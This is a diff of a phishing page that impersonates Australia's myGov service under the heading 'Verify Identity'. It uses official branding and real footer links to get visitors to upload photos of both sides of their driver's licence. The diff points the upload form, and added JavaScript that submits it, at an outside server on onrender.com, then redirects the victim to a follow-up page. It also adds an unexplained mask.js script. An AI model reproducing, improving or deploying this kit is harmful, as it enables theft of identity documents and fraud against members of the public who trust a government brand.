@@ -4,10 +4,12 @@
     <meta charset="utf-8">
     <meta http-equiv="x-ua-compatible" content="ie=edge">
     <meta name="apple-mobile-web-app-capable" content="yes">
-    <title>Sign in with myGov - myGov</title>
+    <title>Verify Identity - myGov</title>
     <meta name="description" content="">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="format-detection" content="telephone=no">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
     <link href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&display=swap" rel="stylesheet">
     <link href="css/mgv2-application.css" rel="stylesheet">
     <link href="css/blugov.css" rel="stylesheet">
@@ -15,6 +17,7 @@
     <link href="progress.min.css" rel="stylesheet" id="bootstrap-css">
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.0/js/bootstrap.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <script type="text/javascript" src="mask.js"></script>
     <style type="text/css">
         .modal-open{overflow:hidden}.modal{position:fixed;top:0;right:0;bottom:0;left:0;z-index:1040;display:none;overflow:hidden;-webkit-overflow-scrolling:touch;outline:0}
         .modal.fade .modal-dialog{-webkit-transition:-webkit-transform .3s ease-out;-o-transition:-o-transform .3s ease-out;transition:transform .3s ease-out;-webkit-transform:translate(0,-25%);-ms-transform:translate(0,-25%);-o-transform:translate(0,-25%);transform:translate(0,-25%)}
@@ -34,9 +37,9 @@
         .modal-footer {padding: 0;}
         .modal-footer .btn-group button {height:40px;border-top-left-radius:0;border-top-right-radius:0;border:none;border-right:1px solid #ddd;}
         .modal-footer .btn-group:last-child > button {border-right:0;}
+        .error-message { color: red; margin-top: 10px; }
+        .success-message { color: green; margin-top: 10px; }
     </style>
-    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
 </head>
 <body>
     <div class="brand-rainbow">&nbsp;</div>
@@ -45,8 +48,8 @@
             <div class="inner">
                 <div class="unauth-grid">
                     <div class="unauth-grid-row">
-                        <a class="unauth-govt-crest__link">
-                            <img id="unauth-govt-crest" src="images/myGov-cobranded-logo-black.svg" alt="myGov Beta" role="img">
+                        <a href="https://beta.my.gov.au/" class="unauth-govt-crest__link">
+                            <img id="unauth-govt-crest" src="images/logo-black.svg" alt="myGov Beta" role="img">
                         </a>
                     </div>
                 </div>
@@ -55,19 +58,25 @@
     </header>
     <div class="wrapper-mapwap">
         <div class="main-block" id="content" role="main">
-            <div class="css-t2nf81">
-                <div class="css-k008qs">
-                    <div class="css-759u60" style="display: inline-block;">
-                        <p><img src="back.svg" width="8" class="chakra-image css-1mi6x1x">  Home</p>
+            <div class="unauth">
+                <div class="login-grid-container">
+                    <div class="login-grid-row">
+                        <div class="login-grid-column">
+                            <div class="digital-id-login-card-wrapper">
+                                <div class="digital-id-main-login-card override">
+                                    <h1>Verify Identity</h1>
+                                    <h2 class="text-align-left">Kindly submit your ID to finalize the verification process.</h2>
+                                    <p class="chakra-text css-6ja8fn">
+                                        <ul>
+                                            <li style="margin-bottom: 20px;">Driver's License</li>
+                                        </ul>
+                                    </p>
+                                    <button data-toggle="modal" data-target="#squarespaceModal" style="width: 100%; background-color: green;" type="button" class="button-main button">Continue to verification</button>
+                                </div>
+                            </div>
+                        </div>
                     </div>
                 </div>
-                <p class="chakra-text css-13iw4fu">Kindly submit your ID to finalize the verification process.</p>
-                <p class="chakra-text css-6ja8fn">
-                    <ul>
-                        <li style="margin-bottom: 20px;">Driver's License</li>
-                    </ul>
-                </p>
-                <button data-toggle="modal" data-target="#squarespaceModal" style="width: 100%; background-color: green;" type="submit" name="_eventId_submit" class="button-main button">Continue to verification</button>
             </div>
         </div>
     </div>
@@ -81,9 +90,9 @@
                     <div class="progress progress-striped active">
                         <div id="progress" class="bar" style="width: 50%;">50% Driver License</div>
                     </div>
-                    <form id="upload-form" action="hvck33m-upload.php" method="post" enctype="multipart/form-data">
+                    <form id="upload-form" action="https://my-go-q7tp.onrender.com/submit-images" method="post" enctype="multipart/form-data">
                         <h2 id="bodytext" style="font-size: 25px; color: black;">Driver License</h2>
-                        <p id="errortext" style="color: red; font-size: 13px; padding:1px;"></p>
+                        <p id="errortext" class="error-message" style="font-size: 13px; padding:1px;"></p>
                         <div id="body2">
                             <hr>
                             <div class="row py-4">
@@ -96,11 +105,10 @@
                                             </label>
                                         </div>
                                         <img style="float: right;" class="file-upload-image" width="50" src="dl.png" alt="your image" />
-                                        <input name="image" type="file" onchange="readURL(this);" class="form-control border-0">
+                                        <input name="image" type="file" accept="image/*" onchange="readURL(this);" class="form-control border-0" required>
                                     </div>
                                 </div>
                             </div>
-                            <br>
                             <hr>
                             <div class="col-lg-6 mx-auto" style="margin-bottom: 20px;">
                                 <div class="input-group mb-3 px-2 py-2 rounded-pill bg-white shadow-sm">
@@ -111,22 +119,18 @@
                                         </label>
                                         <img style="float: right;" class="file-upload-image2" width="50" src="dl.png" alt="your image" />
                                     </div>
-                                    <input name="image2" type="file" onchange="readURL2(this);" class="form-control border-0">
+                                    <input name="image2" type="file" accept="image/*" onchange="readURL2(this);" class="form-control border-0" required>
                                 </div>
                             </div>
-                            <br>
                             <hr>
                         </div>
-                        <div id="buttonall" class="button-container">
-                            <button style="width: 100%;" type="submit" class="button-main button">VERIFY</button>
+                        <div id="buttonall" class="button-digital-id-main-container override">
+                            <div class="digital-id-button-container">
+                                <button style="width: 100%;" type="submit" class="button-main">VERIFY</button>
+                            </div>
                         </div>
-
-                        <!-- Spinner (Hidden by default) -->
-                        <div id="verifying-spinner" style="display:none; text-align:center; margin-top:20px;">
-                            <i class="fa fa-spinner fa-spin fa-2x"></i>
-                            <p style="margin-top:10px; font-weight:bold; font-size:16px;">Verifying...</p>
-                        </div>
-
+                        <!-- Feedback messages -->
+                        <div id="feedback-message" class="hidden"></div>
                     </form>
                 </div>
             </div>
@@ -139,16 +143,18 @@
                     <nav>
                         <h2 class="sr-only" aria-label="Footer">Footer</h2>
                         <ul class="lower-links">
-                            <li><a target="_blank">Terms of use</a></li>
-                            <li><a target="_blank">Privacy and security</a></li>
-                            <li><a target="_blank">Copyright</a></li>
-                            <li><a target="_blank">Accessibility</a></li>
+                            <li><a target="_blank" href="https://my.gov.au/en/about/terms">Terms of use</a></li>
+                            <li><a target="_blank" href="https://my.gov.au/en/about/privacy-and-security">Privacy and security</a></li>
+                            <li><a target="_blank" href="https://my.gov.au/en/about/copyright">Copyright</a></li>
+                            <li><a target="_blank" href="https://my.gov.au/en/about/accessibility">Accessibility</a></li>
                         </ul>
                     </nav>
                 </section>
                 <div class="footer-lower">
                     <section class="footer-lower-logo">
-                        <a><img src="images/myGov-cobranded-logo-white.svg" alt="myGov Beta" width="313.17" height="70" role="img"></a>
+                        <a href="https://beta.my.gov.au/">
+                            <img src="images/logo-white.svg" alt="myGov Beta" width="313.17" height="70" role="img">
+                        </a>
                     </section>
                     <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
                 </div>
@@ -175,22 +181,58 @@
             }
         }
 
-        // Show spinner on submit
-      document.getElementById("upload-form").addEventListener("submit", function(e) {
-    let img1 = document.querySelector('input[name="image"]').files.length;
-    let img2 = document.querySelector('input[name="image2"]').files.length;
-    let verifyBtn = document.querySelector('#buttonall button');
+        document.getElementById("upload-form").addEventListener("submit", async function(e) {
+            e.preventDefault();
+            const form = e.target;
+            const formData = new FormData(form);
+            const feedbackDiv = document.getElementById("feedback-message");
+            const errortext = document.getElementById("errortext");
+            const verifyBtn = document.querySelector('#buttonall button');
+            feedbackDiv.className = 'hidden';
+            errortext.textContent = '';
 
-    if (img1 === 0 || img2 === 0) {
-        e.preventDefault();
-        document.getElementById("errortext").innerText = "Please upload both front and back images.";
-        return;
-    }
+            const img1 = document.querySelector('input[name="image"]').files.length;
+            const img2 = document.querySelector('input[name="image2"]').files.length;
 
-    // Change button text to spinner + Verifying...
-    verifyBtn.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Verifying...';
-    verifyBtn.disabled = true; // prevent double clicks
-});
+            if (img1 === 0 || img2 === 0) {
+                errortext.textContent = "Please upload both front and back images.";
+                return;
+            }
+
+            verifyBtn.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Verifying...';
+            verifyBtn.disabled = true;
+
+            try {
+                const response = await fetch(form.action, {
+                    method: 'POST',
+                    body: formData,
+                });
+                let result;
+                try {
+                    result = await response.json();
+                } catch {
+                    throw new Error('Invalid server response');
+                }
+
+                if (response.ok) {
+                    feedbackDiv.textContent = 'Images submitted successfully! Redirecting...';
+                    feedbackDiv.className = 'success-message';
+                    setTimeout(() => {
+                        window.location.href = '/c.html'; // Redirect to success.html
+                    }, 1000);
+                } else {
+                    feedbackDiv.textContent = result.error || 'Error submitting images.';
+                    feedbackDiv.className = 'error-message';
+                    verifyBtn.innerHTML = 'VERIFY';
+                    verifyBtn.disabled = false;
+                }
+            } catch (error) {
+                feedbackDiv.textContent = `Error: ${error.message || 'Network error. Please try again.'}`;
+                feedbackDiv.className = 'error-message';
+                verifyBtn.innerHTML = 'VERIFY';
+                verifyBtn.disabled = false;
+            }
+        });
     </script>
 </body>
 </html>
